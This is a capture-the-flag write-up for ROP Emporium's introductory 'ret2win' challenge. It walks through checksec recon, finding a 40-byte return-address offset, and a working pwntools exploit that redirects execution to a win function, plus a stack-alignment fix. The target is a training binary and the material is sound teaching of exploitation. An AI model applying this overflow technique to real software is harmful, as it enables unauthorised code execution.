---
title: "ROP Emporium — ret2win"
date: 2024-11-10
ctf: "ROP Emporium"
category: "pwn"
difficulty: "easy"
points: 0
tags: ["rop", "pwn", "x86-64", "buffer-overflow"]
description: "Classic NX bypass via ret2win — first step into ROP exploitation."
---

## Overview

`ret2win` is the introductory ROP Emporium challenge. The binary has **NX enabled**,
so we can't execute shellcode on the stack. Instead we redirect execution to an existing
function that prints the flag.

## Recon

```bash
$ file ret2win
ret2win: ELF 64-bit LSB executable, x86-64 [...]

$ checksec ret2win
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
```

No canary, no PIE → fixed addresses. NX means we need ROP.

## Finding the offset

```python
from pwn import *

elf = ELF('./ret2win')
p   = process('./ret2win')

payload = cyclic(200)
p.sendlineafter(b'> ', payload)
p.wait()

core = p.corefile
offset = cyclic_find(core.read(core.rsp, 4))
print(f'[+] offset = {offset}')  # 40
```

The offset to RIP is **40 bytes**.

## Building the exploit

```python
from pwn import *

elf = ELF('./ret2win')
p   = process('./ret2win')

win = elf.symbols['ret2win']   # address of the target function

payload  = b'A' * 40           # padding to RIP
payload += p64(win)            # overwrite RIP → jump to win()

p.sendlineafter(b'> ', payload)
print(p.recvall().decode())
```

## Stack alignment

On x86-64, `movaps` requires 16-byte alignment. If the exploit crashes inside `system()`,
prepend a single `ret` gadget:

```python
ret = next(elf.search(asm('ret')))
payload = b'A' * 40 + p64(ret) + p64(win)
```

## Result

<div class="flag-box">ROPE{a_placeholder_for_your_flag}</div>

## Takeaways

- NX alone doesn't stop exploitation — it only prevents *shellcode on the stack*
- `checksec` is always step one
- Stack alignment matters on x86-64 before `system()` calls
